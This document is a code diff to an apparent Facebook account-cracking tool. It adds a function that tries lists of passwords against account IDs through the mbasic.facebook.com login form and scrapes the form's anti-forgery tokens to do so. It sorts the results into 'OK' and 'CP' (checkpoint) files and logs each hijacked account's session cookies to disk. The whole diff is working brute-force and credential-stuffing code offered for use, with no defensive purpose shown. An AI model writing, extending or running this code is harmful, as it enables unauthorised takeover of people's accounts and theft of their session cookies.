@@ -1626,7 +1626,7 @@ def metslow():
                 elif "validate" in method:
                     pool.submit(validate, idf, pwv)
                 elif "mbasik" in method:
-                    pool.submit(mobile, idf, pwv)
+                    pool.submit(crackbasi, idf, pwv)
                 elif "regulerv2" in method:
                     pool.submit(main_alpha, idf, pwv)
                 else:
@@ -1695,7 +1695,7 @@ def metcepat():
                 elif "validate" in method:
                     pool.submit(validate, idf, pwv)
                 elif "mbasik" in method:
-                    pool.submit(mobile, idf, pwv)
+                    pool.submit(crackbasi, idf, pwv)
                 elif "regulerv2" in method:
                     pool.submit(main_alpha,idf, pwv)
                 else:
@@ -1715,6 +1715,38 @@ def metcepat():
     print("")
 
 
+
+
+def crackbasi(idf,pwv):
+	global loop,ok,cp
+	prog.update(des,description=f'\r{H}Run 2{P} {H}{idf}{P} {loop} {H}LIVE-:{ok} {K}CHEK-:{cp}  ')
+	prog.advance(des)
+	ua = random.choice(ugen)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
+			head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+			  print(f"{P}[{K}CP{P}] {idf}|{pw}")
+			  open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+			  akun.append(idf+'|'+pw)
+			  cp+=1
+			  break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f"{P}[{H}OK{P}] {idf}|{pw}|{kuki}")
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 def ua_valid():
     rr = random.randint
     rc = random.choice
